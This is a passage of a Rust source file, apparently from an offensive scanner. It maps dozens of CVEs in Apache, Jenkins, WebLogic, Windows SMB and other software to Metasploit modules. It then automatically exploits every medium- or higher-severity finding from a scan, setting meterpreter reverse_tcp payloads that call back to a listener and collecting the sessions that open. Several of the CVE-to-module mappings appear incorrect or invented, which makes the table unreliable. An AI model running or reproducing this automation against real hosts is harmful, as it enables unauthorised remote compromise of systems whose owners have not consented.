        self.exploit_database.insert(
            "CVE-2024-38476".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/apache_http_server_traversal".to_string(),
                    name: "Apache HTTP Server Path Traversal".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2024-38476".to_string()],
                    targets: vec!["Apache HTTP Server 2.4.59".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-25690 (Apache HTTP Server Request Smuggling)
        self.exploit_database.insert(
            "CVE-2023-25690".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/apache_http_smuggling".to_string(),
                    name: "Apache HTTP Server Request Smuggling".to_string(),
                    rank: "Great".to_string(),
                    cve_ids: vec!["CVE-2023-25690".to_string()],
                    targets: vec!["Apache HTTP Server 2.4.0-2.4.55".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2021-41773 (Apache Path Traversal)
        self.exploit_database.insert(
            "CVE-2021-41773".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/apache_normalize_path_rce".to_string(),
                    name: "Apache HTTP Server 2.4.49 Path Traversal RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-41773".to_string(), "CVE-2021-42013".to_string()],
                    targets: vec!["Apache HTTP Server 2.4.49-2.4.50".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === NGINX VULNERABILITIES ===
        
        // CVE-2021-23017 (NGINX Resolver Off-by-One)
        self.exploit_database.insert(
            "CVE-2021-23017".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/nginx_resolver_off_by_one".to_string(),
                    name: "NGINX Resolver Off-by-One Heap Write".to_string(),
                    rank: "Great".to_string(),
                    cve_ids: vec!["CVE-2021-23017".to_string()],
                    targets: vec!["NGINX 0.6.18-1.20.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === TOMCAT VULNERABILITIES ===
        
        // CVE-2020-1938 (Tomcat Ghostcat AJP)
        self.exploit_database.insert(
            "CVE-2020-1938".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/admin/http/tomcat_ghostcat".to_string(),
                    name: "Apache Tomcat AJP Ghostcat File Read/Inclusion".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2020-1938".to_string()],
                    targets: vec!["Tomcat 6.0-9.0.31".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2020-9484 (Tomcat RCE via Session Persistence)
        self.exploit_database.insert(
            "CVE-2020-9484".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/tomcat_session_persistence_rce".to_string(),
                    name: "Apache Tomcat RCE via Session Persistence".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2020-9484".to_string()],
                    targets: vec!["Tomcat 7.0-10.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === JENKINS VULNERABILITIES ===
        
        // CVE-2024-23897 (Jenkins Arbitrary File Read)
        self.exploit_database.insert(
            "CVE-2024-23897".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/scanner/http/jenkins_arbitrary_file_read".to_string(),
                    name: "Jenkins Arbitrary File Read via CLI".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2024-23897".to_string()],
                    targets: vec!["Jenkins 2.441".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-27903 (Jenkins Script Console RCE)
        self.exploit_database.insert(
            "CVE-2023-27903".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/jenkins_script_console".to_string(),
                    name: "Jenkins Script Console Unauthenticated RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-27903".to_string()],
                    targets: vec!["Jenkins 2.270-2.393".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2018-1000861 (Jenkins Groovy Sandbox Bypass)
        self.exploit_database.insert(
            "CVE-2018-1000861".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/jenkins_pipeline_groovy_rce".to_string(),
                    name: "Jenkins Pipeline Groovy Plugin Sandbox Bypass RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2018-1000861".to_string()],
                    targets: vec!["Jenkins Pipeline 2.6".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === DOCKER/KUBERNETES VULNERABILITIES ===
        
        // CVE-2024-21626 (runc Container Escape)
        self.exploit_database.insert(
            "CVE-2024-21626".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/local/runc_container_escape".to_string(),
                    name: "runc Process Descriptor Leak Container Escape".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2024-21626".to_string()],
                    targets: vec!["runc 1.0.0-1.1.11".to_string()],
                    required_options: vec!["SESSION".to_string()],
                }
            ]
        );

        // CVE-2022-0185 (Kubernetes Heap-Based Buffer Overflow)
        self.exploit_database.insert(
            "CVE-2022-0185".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/local/cve_2022_0185_linux_kernel_privesc".to_string(),
                    name: "Linux Kernel Heap-Based Buffer Overflow Privilege Escalation".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-0185".to_string()],
                    targets: vec!["Linux Kernel 5.1-5.16".to_string()],
                    required_options: vec!["SESSION".to_string()],
                }
            ]
        );

        // CVE-2021-25741 (Kubernetes Path Traversal)
        self.exploit_database.insert(
            "CVE-2021-25741".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/kubernetes_symlink_traversal".to_string(),
                    name: "Kubernetes Symlink Exchange Path Traversal".to_string(),
                    rank: "Great".to_string(),
                    cve_ids: vec!["CVE-2021-25741".to_string()],
                    targets: vec!["Kubernetes 1.8-1.22".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === SAP VULNERABILITIES ===
        
        // CVE-2024-22121 (SAP NetWeaver AS JAVA RCE)
        self.exploit_database.insert(
            "CVE-2024-22121".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/sap/netweaver_java_rce".to_string(),
                    name: "SAP NetWeaver AS JAVA Unauthenticated RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2024-22121".to_string()],
                    targets: vec!["SAP NetWeaver AS JAVA 7.5".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-29186 (SAP Commerce Cloud SSRF)
        self.exploit_database.insert(
            "CVE-2023-29186".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/sap/commerce_cloud_ssrf".to_string(),
                    name: "SAP Commerce Cloud SSRF to RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-29186".to_string()],
                    targets: vec!["SAP Commerce Cloud 2211".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-22536 (SAP NetWeaver Invoker Servlet)
        self.exploit_database.insert(
            "CVE-2022-22536".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/sap/netweaver_invoker_servlet_rce".to_string(),
                    name: "SAP NetWeaver Invoker Servlet RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-22536".to_string()],
                    targets: vec!["SAP NetWeaver 7.3-7.5".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === ORACLE/JAVA VULNERABILITIES ===
        
        // CVE-2023-21839 (Oracle WebLogic Server RCE)
        self.exploit_database.insert(
            "CVE-2023-21839".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/oracle_weblogic_rce".to_string(),
                    name: "Oracle WebLogic Server Deserialization RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-21839".to_string()],
                    targets: vec!["WebLogic Server 12.2.1.3-14.1.1.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2020-14882 (Oracle WebLogic Server Console RCE)
        self.exploit_database.insert(
            "CVE-2020-14882".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/oracle_weblogic_console_rce".to_string(),
                    name: "Oracle WebLogic Server Administration Console RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2020-14882".to_string(), "CVE-2020-14883".to_string()],
                    targets: vec!["WebLogic Server 10.3.6-14.1.1.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2017-10271 (Oracle WebLogic WLS Security Component)
        self.exploit_database.insert(
            "CVE-2017-10271".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/oracle_weblogic_wls_wsat_rce".to_string(),
                    name: "Oracle WebLogic WLS Security Component RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2017-10271".to_string()],
                    targets: vec!["WebLogic Server 10.3.6-12.2.1.3".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === IIS/ASP.NET VULNERABILITIES ===
        
        // CVE-2022-21907 (IIS HTTP Protocol Stack RCE)
        self.exploit_database.insert(
            "CVE-2022-21907".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/iis_http_protocol_stack_rce".to_string(),
                    name: "Microsoft IIS HTTP Protocol Stack RCE".to_string(),
                    rank: "Great".to_string(),
                    cve_ids: vec!["CVE-2022-21907".to_string()],
                    targets: vec!["Windows Server 2019-2022".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2021-31166 (IIS HTTP.sys RCE)
        self.exploit_database.insert(
            "CVE-2021-31166".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/iis_httpsys_rce".to_string(),
                    name: "Microsoft IIS HTTP.sys RCE".to_string(),
                    rank: "Great".to_string(),
                    cve_ids: vec!["CVE-2021-31166".to_string()],
                    targets: vec!["Windows 10".to_string(), "Windows Server 2019".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === SPLUNK VULNERABILITIES ===
        
        // CVE-2023-46214 (Splunk Path Traversal)
        self.exploit_database.insert(
            "CVE-2023-46214".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/splunk_path_traversal_rce".to_string(),
                    name: "Splunk Enterprise Path Traversal to RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-46214".to_string()],
                    targets: vec!["Splunk Enterprise 9.0-9.1.2".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-43571 (Splunk Command Injection)
        self.exploit_database.insert(
            "CVE-2022-43571".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/splunk_upload_app_exec".to_string(),
                    name: "Splunk Enterprise Authenticated Command Injection".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-43571".to_string()],
                    targets: vec!["Splunk Enterprise 8.1-9.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string(), "USERNAME".to_string(), "PASSWORD".to_string()],
                }
            ]
        );

        // === ZOHO VULNERABILITIES ===
        
        // CVE-2021-44515 (Zoho ManageEngine RCE)
        self.exploit_database.insert(
            "CVE-2021-44515".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/zoho_manageengine_adselfservice_plus_rce".to_string(),
                    name: "Zoho ManageEngine ADSelfService Plus Unauthenticated RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-44515".to_string()],
                    targets: vec!["ADSelfService Plus 6113".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2021-40539 (Zoho ManageEngine Desktop Central RCE)
        self.exploit_database.insert(
            "CVE-2021-40539".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/zoho_manageengine_desktop_central_rce".to_string(),
                    name: "Zoho ManageEngine Desktop Central Authentication Bypass RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-40539".to_string()],
                    targets: vec!["Desktop Central 10.1.2127.17".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === VEEAM VULNERABILITIES ===
        
        // CVE-2023-27532 (Veeam Backup & Replication Credentials Leak)
        self.exploit_database.insert(
            "CVE-2023-27532".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/gather/veeam_backup_credentials".to_string(),
                    name: "Veeam Backup & Replication Credentials Disclosure".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2023-27532".to_string()],
                    targets: vec!["Veeam Backup & Replication 11".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === ATLASSIAN/JIRA VULNERABILITIES ===
        
        // CVE-2022-0540 (Atlassian Jira Seraph Auth Bypass)
        self.exploit_database.insert(
            "CVE-2022-0540".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/atlassian_jira_seraph_auth_bypass".to_string(),
                    name: "Atlassian Jira Seraph Authentication Bypass".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-0540".to_string()],
                    targets: vec!["Jira Server/Data Center 8.13-8.20".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2019-11581 (Atlassian Jira Template Injection)
        self.exploit_database.insert(
            "CVE-2019-11581".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/atlassian_jira_template_injection".to_string(),
                    name: "Atlassian Jira Template Injection RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2019-11581".to_string()],
                    targets: vec!["Jira Server 4.4-7.13.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === F5 BIG-IP VULNERABILITIES ===
        
        // CVE-2022-1388 (F5 BIG-IP iControl REST Auth Bypass)
        self.exploit_database.insert(
            "CVE-2022-1388".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/f5_icontrol_rest_auth_bypass_rce".to_string(),
                    name: "F5 BIG-IP iControl REST Authentication Bypass RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-1388".to_string()],
                    targets: vec!["BIG-IP 13.1-17.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2020-5902 (F5 BIG-IP TMUI RCE)
        self.exploit_database.insert(
            "CVE-2020-5902".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/f5_bigip_tmui_rce".to_string(),
                    name: "F5 BIG-IP Traffic Management User Interface (TMUI) RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2020-5902".to_string()],
                    targets: vec!["BIG-IP 11.6-15.1".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === PULSE SECURE VULNERABILITIES ===
        
        // CVE-2021-22893 (Pulse Secure Arbitrary File Read)
        self.exploit_database.insert(
            "CVE-2021-22893".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/gather/pulse_secure_file_disclosure".to_string(),
                    name: "Pulse Secure Arbitrary File Disclosure".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2021-22893".to_string()],
                    targets: vec!["Pulse Connect Secure 9.0-9.1".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2019-11510 (Pulse Secure VPN Path Traversal)
        self.exploit_database.insert(
            "CVE-2019-11510".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/gather/pulse_secure_vpn_traversal".to_string(),
                    name: "Pulse Secure SSL VPN Arbitrary File Disclosure".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2019-11510".to_string()],
                    targets: vec!["Pulse Connect Secure 8.1-8.3".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === PROFTPD VULNERABILITIES ===
        
        // CVE-2019-12815 (ProFTPD mod_copy Arbitrary File Copy)
        self.exploit_database.insert(
            "CVE-2019-12815".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/unix/ftp/proftpd_modcopy_exec".to_string(),
                    name: "ProFTPD mod_copy Arbitrary File Copy to RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2019-12815".to_string()],
                    targets: vec!["ProFTPD 1.3.5-1.3.6".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === VSFTPD VULNERABILITIES ===
        
        // CVE-2011-2523 (VSFTPD Backdoor)
        self.exploit_database.insert(
            "CVE-2011-2523".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/unix/ftp/vsftpd_234_backdoor".to_string(),
                    name: "VSFTPD v2.3.4 Backdoor Command Execution".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2011-2523".to_string()],
                    targets: vec!["VSFTPD 2.3.4".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === SAMBA VULNERABILITIES ===
        
        // CVE-2022-32742 (Samba AD DC RCE)
        self.exploit_database.insert(
            "CVE-2022-32742".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/smb/samba_ad_dc_rce".to_string(),
                    name: "Samba Active Directory Domain Controller RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-32742".to_string()],
                    targets: vec!["Samba 4.0-4.16".to_string()],
                    required_options: vec!["RHOSTS".to_string()],
                }
            ]
        );

        // CVE-2017-7494 (SambaCry)
        self.exploit_database.insert(
            "CVE-2017-7494".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/samba/is_known_pipename".to_string(),
                    name: "Samba is_known_pipename() RCE (SambaCry)".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2017-7494".to_string()],
                    targets: vec!["Samba 3.5.0-4.6.4".to_string()],
                    required_options: vec!["RHOSTS".to_string()],
                }
            ]
        );

        // === ELASTICSEARCH VULNERABILITIES ===
        
        // CVE-2015-1427 (Elasticsearch Groovy Sandbox Bypass)
        self.exploit_database.insert(
            "CVE-2015-1427".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/elasticsearch/script_mvel_rce".to_string(),
                    name: "Elasticsearch Groovy Sandbox Bypass RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2015-1427".to_string()],
                    targets: vec!["Elasticsearch 1.3.0-1.3.7".to_string(), "Elasticsearch 1.4.0-1.4.2".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === REDIS VULNERABILITIES ===
        
        // CVE-2022-0543 (Redis Lua Sandbox Escape)
        self.exploit_database.insert(
            "CVE-2022-0543".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/redis/redis_lua_sandbox_escape".to_string(),
                    name: "Redis Lua Sandbox Escape RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-0543".to_string()],
                    targets: vec!["Redis 5.0-7.0 (Debian)".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === GRAFANA VULNERABILITIES ===
        
        // CVE-2023-3128 (Grafana Account Takeover)
        self.exploit_database.insert(
            "CVE-2023-3128".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/grafana_account_takeover".to_string(),
                    name: "Grafana Account Takeover via Session Hijacking".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-3128".to_string()],
                    targets: vec!["Grafana 9.4.0-9.5.4".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2021-43798 (Grafana Path Traversal)
        self.exploit_database.insert(
            "CVE-2021-43798".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/scanner/http/grafana_plugin_traversal".to_string(),
                    name: "Grafana Unauthenticated Path Traversal".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2021-43798".to_string()],
                    targets: vec!["Grafana 8.0.0-8.3.1".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === NODEJS/NPM VULNERABILITIES ===
        
        // CVE-2021-21315 (System Information Command Injection)
        self.exploit_database.insert(
            "CVE-2021-21315".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/nodejs_systeminformation_cmd_inject".to_string(),
                    name: "Node.js systeminformation Command Injection".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-21315".to_string()],
                    targets: vec!["systeminformation 5.3.1".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === COLDFUSION VULNERABILITIES ===
        
        // CVE-2023-26360 (Adobe ColdFusion Deserialization)
        self.exploit_database.insert(
            "CVE-2023-26360".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/coldfusion_deserialization_rce".to_string(),
                    name: "Adobe ColdFusion Deserialization RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-26360".to_string()],
                    targets: vec!["ColdFusion 2018-2023".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2018-15961 (Adobe ColdFusion Unrestricted File Upload)
        self.exploit_database.insert(
            "CVE-2018-15961".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/coldfusion_fckeditor_traversal_upload".to_string(),
                    name: "Adobe ColdFusion FCKeditor Arbitrary File Upload".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2018-15961".to_string()],
                    targets: vec!["ColdFusion 11-2016".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // === WINDOWS PRINT SPOOLER VULNERABILITIES ===
        
        // CVE-2021-34527 (PrintNightmare)
        self.exploit_database.insert(
            "CVE-2021-34527".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/dcerpc/cve_2021_1675_printnightmare".to_string(),
                    name: "Windows Print Spooler PrintNightmare RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-34527".to_string(), "CVE-2021-1675".to_string()],
                    targets: vec!["Windows 7-Server 2022".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "SMBUser".to_string(), "SMBPass".to_string()],
                }
            ]
        );

        // === WINDOWS SMB VULNERABILITIES ===
        
        // CVE-2020-0796 (SMBGhost)
        self.exploit_database.insert(
            "CVE-2020-0796".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/smb/cve_2020_0796_smbghost".to_string(),
                    name: "Windows SMBv3 Compression RCE (SMBGhost)".to_string(),
                    rank: "Great".to_string(),
                    cve_ids: vec!["CVE-2020-0796".to_string()],
                    targets: vec!["Windows 10 1903-1909".to_string(), "Windows Server 1903-1909".to_string()],
                    required_options: vec!["RHOSTS".to_string()],
                }
            ]
        );

        println!("📊 Loaded {} CVE → MSF exploit mappings", self.exploit_database.len());
        Ok(())
    }

    /// Cerca exploits disponibili per un CVE
    pub fn find_exploits_for_cve(&self, cve_id: &str) -> Vec<&MetasploitExploit> {
        self.exploit_database
            .get(cve_id)
            .map(|v| v.iter().collect())
            .unwrap_or_default()
    }

    /// Esegue exploit automatico per una vulnerabilità
    pub async fn auto_exploit(
        &self,
        cve_id: &str,
        target_ip: &str,
        target_port: u16,
        payload: Option<&str>,
        lhost: Option<&str>,
        lport: Option<u16>,
    ) -> Result<ExploitResult, Box<dyn std::error::Error>> {
        
        let exploits = self.find_exploits_for_cve(cve_id);
        
        if exploits.is_empty() {
            return Err(format!("No Metasploit exploit found for {}", cve_id).into());
        }

        // Usa il primo exploit disponibile (rank più alto)
        let exploit = exploits[0];

        println!("🎯 Launching Metasploit exploit: {}", exploit.name);
        println!("   Module: {}", exploit.module_path);
        println!("   Target: {}:{}", target_ip, target_port);

        // Costruisci comandi msfconsole
        let mut commands = vec![
            format!("use {}", exploit.module_path),
            format!("set RHOSTS {}", target_ip),
            format!("set RPORT {}", target_port),
        ];

        // Payload configuration
        if let Some(payload_name) = payload {
            commands.push(format!("set PAYLOAD {}", payload_name));
        } else {
            // Default payload basato su tipo exploit
            if exploit.module_path.contains("windows") {
                commands.push("set PAYLOAD windows/meterpreter/reverse_tcp".to_string());
            } else {
                commands.push("set PAYLOAD linux/x86/meterpreter/reverse_tcp".to_string());
            }
        }

        // LHOST/LPORT for reverse shells
        if let Some(lhost_val) = lhost {
            commands.push(format!("set LHOST {}", lhost_val));
        }
        if let Some(lport_val) = lport {
            commands.push(format!("set LPORT {}", lport_val));
        } else {
            commands.push("set LPORT 4444".to_string());
        }

        // Exploit options
        commands.push("check".to_string());  // Verifica vulnerabilità
        commands.push("exploit -z".to_string());  // Exploit con background session
        commands.push("sessions -l".to_string());  // Lista sessioni
        commands.push("exit".to_string());

        // Esegui msfconsole
        let output = self.run_msfconsole_commands(&commands)?;

        // Parse output per determinare successo
        let success = output.contains("[+]") || output.contains("Meterpreter session");
        let session_id = extract_session_id(&output);

        Ok(ExploitResult {
            success,
            module_used: exploit.module_path.clone(),
            target_info: format!("{}:{}", target_ip, target_port),
            session_id,
            output,
            timestamp: chrono::Utc::now().to_rfc3339(),
        })
    }

    /// Esegue comandi msfconsole via resource script
    fn run_msfconsole_commands(&self, commands: &[String]) -> Result<String, Box<dyn std::error::Error>> {
        // Crea resource script temporaneo
        let resource_script = commands.join("\n");
        let script_path = "nextmap_msf_auto.rc";
        
        std::fs::write(script_path, resource_script)?;

        // Esegui msfconsole con resource script
        let output = if cfg!(windows) {
            Command::new("cmd")
                .args(&["/C", &self.msf_path, "-q", "-r", script_path])
                .output()?
        } else {
            Command::new(&self.msf_path)
                .args(&["-q", "-r", script_path])
                .output()?
        };

        // Cleanup
        let _ = std::fs::remove_file(script_path);

        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    }

    /// Esegue scan di vulnerabilità con moduli auxiliary
    pub async fn run_auxiliary_scan(
        &self,
        module: &str,
        target_ip: &str,
        target_port: u16,
    ) -> Result<String, Box<dyn std::error::Error>> {
        
        let commands = vec![
            format!("use {}", module),
            format!("set RHOSTS {}", target_ip),
            format!("set RPORT {}", target_port),
            "run".to_string(),
            "exit".to_string(),
        ];

        self.run_msfconsole_commands(&commands)
    }

    /// Lista tutti gli exploits disponibili nel database
    pub fn list_available_exploits(&self) -> Vec<(&String, &Vec<MetasploitExploit>)> {
        self.exploit_database.iter().collect()
    }
}

/// Estrae Session ID dall'output di msfconsole
fn extract_session_id(output: &str) -> Option<u32> {
    // Cerca pattern: "Meterpreter session 1 opened"
    for line in output.lines() {
        if line.contains("session") && line.contains("opened") {
            // Estrai numero sessione
            let words: Vec<&str> = line.split_whitespace().collect();
            for (i, word) in words.iter().enumerate() {
                if word.contains("session") && i + 1 < words.len() {
                    if let Ok(session_id) = words[i + 1].parse::<u32>() {
                        return Some(session_id);
                    }
                }
            }
        }
    }
    None
}

/// Auto-exploitation di host vulnerabili da scan results
pub async fn auto_exploit_scan_results(
    scan_results: &ScanResult,
    msf_client: &MetasploitClient,
    lhost: &str,
    dry_run: bool,
) -> Vec<ExploitResult> {
    
    let mut results = Vec::new();

    for host in &scan_results.hosts {
        println!("\n🎯 Processing host: {}", host.ip_address);
        
        for vuln in &host.vulnerabilities {
            // Salta vulnerabilità informative
            if vuln.severity == "Info" || vuln.severity == "Low" {
                continue;
            }

            println!("  🔍 Found {} ({}) on port {}", 
                vuln.cve_id, vuln.severity, vuln.service_port);

            // Cerca exploit disponibile
            let exploits = msf_client.find_exploits_for_cve(&vuln.cve_id);
            
            if exploits.is_empty() {
                println!("    ⚠️ No Metasploit exploit available");
                continue;
            }

            if dry_run {
                println!("    🔹 [DRY-RUN] Would exploit with: {}", exploits[0].module_path);
                continue;
            }

            // Esegui exploit
            match msf_client.auto_exploit(
                &vuln.cve_id,
                &host.ip_address,
                vuln.service_port,
                None,  // Auto-select payload
                Some(lhost),
                Some(4444),
            ).await {
                Ok(result) => {
                    if result.success {
                        println!("    ✅ Exploit successful! Session ID: {:?}", result.session_id);
                    } else {
                        println!("    ❌ Exploit failed");
                    }
                    results.push(result);
                }
                Err(e) => {
                    println!("    ❌ Error: {}", e);
                }
            }
        }
    }

    results
}

#[cfg(test)]
